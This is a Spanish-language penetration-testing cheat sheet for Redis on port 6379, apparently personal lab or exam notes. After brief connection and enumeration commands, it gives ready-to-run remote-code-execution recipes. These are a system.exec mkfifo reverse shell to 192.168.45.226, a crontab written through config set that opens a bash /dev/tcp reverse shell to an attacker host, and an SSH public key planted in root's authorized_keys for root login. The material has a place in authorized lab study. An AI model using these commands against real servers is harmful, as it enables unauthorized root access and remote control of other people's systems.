---
tags: [ports, redis, database]
---

# 6379 — Redis

## Conexión

```bash
nc -vn 10.10.10.10 6379

redis-cli -h 10.10.10.10   # sudo apt-get install redis-tools
```

## Enumeración

```
MODULE LIST
```

Si aparece **system** en la lista → probable RCE.

```bash
INFO              # info del servidor, versión, OS
CONFIG GET *      # configuración completa
KEYS *            # todas las claves almacenadas
GET <clave>       # valor de una clave
```

## RCE via Módulo system

```bash
system.exec "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.226 9001 >/tmp/f"
```

## RCE via Crontab (sin autenticación)

```bash
redis-cli -h <IP> config set dir /var/spool/cron/crontabs
redis-cli -h <IP> config set dbfilename root
redis-cli -h <IP> set x "\n\n* * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1\n\n"
redis-cli -h <IP> save
```

## RCE via SSH Authorized Keys

```bash
ssh-keygen -t rsa -f /tmp/redis_key

redis-cli -h <IP> config set dir /root/.ssh
redis-cli -h <IP> config set dbfilename authorized_keys
redis-cli -h <IP> set payload "\n\n$(cat /tmp/redis_key.pub)\n\n"
redis-cli -h <IP> save

ssh -i /tmp/redis_key root@<IP>
```
